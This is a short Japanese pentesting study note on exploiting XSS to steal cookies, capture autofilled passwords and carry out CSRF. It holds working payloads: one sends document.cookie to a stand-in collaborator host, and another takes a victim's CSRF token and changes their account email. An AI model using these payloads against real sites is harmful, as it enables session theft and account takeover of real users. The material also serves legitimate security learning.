## Cookieの窃取

###### 方法概要

- document.writeを使い、攻撃者のサーバにcookieを送る
```js
<script type="text/javascript"> 
document.write("<iframe src='http://COLLABORATOR_DOMAIN?cookie="+document.cookie+"'></iframe>");
</script>
```

- cookieにパスワードなど情報が含まれているか検証する
- 含まれていないなら[6. XSSの悪用による3つの目標達成](6.%20XSSの悪用による3つの目標達成.md#Passwordの窃取)へ

###### Cookie窃取の現実での障壁

- ユーザはログインしてないことがある
- `HttpOnly`フラグでJSからCookieを窃取できないように設定している
- ユーザのIPアドレスなどによるブロックでセッションがロックされている
- セッションの有効期限が乗っ取り完了するまえに切れる

## Passwordの窃取

###### 方法概要

- 被害者がパスワード自動入力のパスワードマネジャーを使用していることを確認する
- 自動入力されたパスワードを攻撃者のドメインに送信する
###### メリットとデメリット

- [6. XSSの悪用による3つの目標達成](6.%20XSSの悪用による3つの目標達成.md#Cookie窃取の現実での障壁)のようなことがほとんどない
- 欠点は、パスワードの自動入力を行うパスワードマネジャーを使用するユーザにしか使えない

## CSRFの実行

###### CSRFとは

- 具体的に、被害者がログイン後のメールアドレス変更で、攻撃者の管理するメールアドレスに変更し、パスワードリセットメールを攻撃者に送らせるなど
- CSRF単体の場合と、CSRF ✖︎ XSSの場合がある

###### 悪用例：パスワードなしでのメールアドレス変更が可能なケース with 持続型XSS

- [参考：HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#stealing-csrf-tokens)

1. XSSの脆弱性を明らかにする
2. パスワードなしで実行可能な機能(リクエスト)を明らかにする
	- 今回はメールアドレスの変更。

3. XSSの脆弱性があるページのレスポンスにcsrf tokenがあることを確認する
4. ページに訪れた被害者のcsrf tokenを窃取し、ステップ2で明らかにした機能を実行させるため、XSSのペイロードを注入する
```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
